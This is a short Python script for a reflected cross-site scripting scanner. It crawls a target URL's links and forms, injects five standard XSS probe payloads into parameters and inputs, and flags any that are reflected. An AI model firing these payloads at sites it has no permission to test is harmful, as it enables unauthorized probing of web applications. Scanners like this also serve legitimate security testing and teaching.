import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

xss_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "';alert(1);//",
    "<svg/onload=alert(1)>",
    "<body onload=alert(1)>"
]

headers = {
    "User-Agent": "Mozilla/5.0 (XSS Scanner)"
}

def get_links(base_url):
    try:
        response = requests.get(base_url, headers=headers, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        anchors = soup.find_all("a")

        links = set()
        for tag in anchors:
            href = tag.get("href")
            if href:
                full_url = urljoin(base_url, href)
                if urlparse(full_url).scheme.startswith("http"):
                    links.add(full_url)
        return list(links)
    except Exception as e:
        print(f"[x] Failed to get links: {e}")
        return []

def inject_payload(url, payload):
    parsed = urlparse(url)
    query_params = parse_qs(parsed.query)
    new_params = {k: payload for k in query_params}
    new_query = urlencode(new_params, doseq=True)

    injected_url = urlunparse((
        parsed.scheme,
        parsed.netloc,
        parsed.path,
        parsed.params,
        new_query,
        parsed.fragment
    ))
    return injected_url

def scan_url_for_xss(url):
    for payload in xss_payloads:
        injected = inject_payload(url, payload)
        try:
            response = requests.get(injected, headers=headers, timeout=5)
            if payload in response.text:
                print(f"\033[91m[!] XSS Found: {injected}\n    Payload: {payload}\033[0m")
            else:
                print(f"[✓] Clean: {injected}")
        except Exception as e:
            print(f"[x] Error requesting {injected}: {e}")

def get_forms(url):
    try:
        response = requests.get(url, headers=headers, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")
        return soup.find_all("form")
    except Exception as e:
        print(f"[x] Error getting forms: {e}")
        return []

def form_details(form):
    action = form.get("action")
    method = form.get("method", "get").lower()
    inputs = []

    for input_tag in form.find_all("input"):
        name = input_tag.get("name")
        input_type = input_tag.get("type", "text")
        if name:
            inputs.append((name, input_type))
    return action, method, inputs

def scan_forms_for_xss(url):
    forms = get_forms(url)
    print(f"\n[*] Found {len(forms)} form(s) on: {url}")

    for i, form in enumerate(forms, 1):
        print(f"\n[→] Scanning Form #{i}")
        action, method, inputs = form_details(form)
        target_url = urljoin(url, action)

        for payload in xss_payloads:
            data = {}
            for name, _type in inputs:
                data[name] = payload

            try:
                if method == "post":
                    res = requests.post(target_url, data=data, headers=headers)
                else:
                    res = requests.get(target_url, params=data, headers=headers)

                if payload in res.text:
                    print(f"\033[91m[!] XSS in form #{i} → {target_url}\n    Payload: {payload}\033[0m")
                    break
                else:
                    print(f"[✓] Payload not reflected in form #{i}")
            except Exception as e:
                print(f"[x] Error testing form #{i}: {e}")

def main():
    base_url = input("Enter the target URL (e.g. https://example.com): ").strip()
    print(f"\n[+] Scanning: {base_url}")

    links = get_links(base_url)
    print(f"\n[+] Found {len(links)} link(s):")
    for i, link in enumerate(links, start=1):
        print(f"  [{i}] {link}")

    target_links = [link for link in links if urlparse(link).query]

    print(f"\n[+] Found {len(target_links)} link(s) with query parameters to test:")
    for link in target_links:
        print(f"\n[*] Testing URL: {link}")
        scan_url_for_xss(link)
        print("-" * 60)

    choice = input("\nDo you want to scan forms on the base page for XSS? (yes/no): ").strip().lower()
    if choice == "yes":
        scan_forms_for_xss(base_url)

if __name__ == "__main__":
    main()
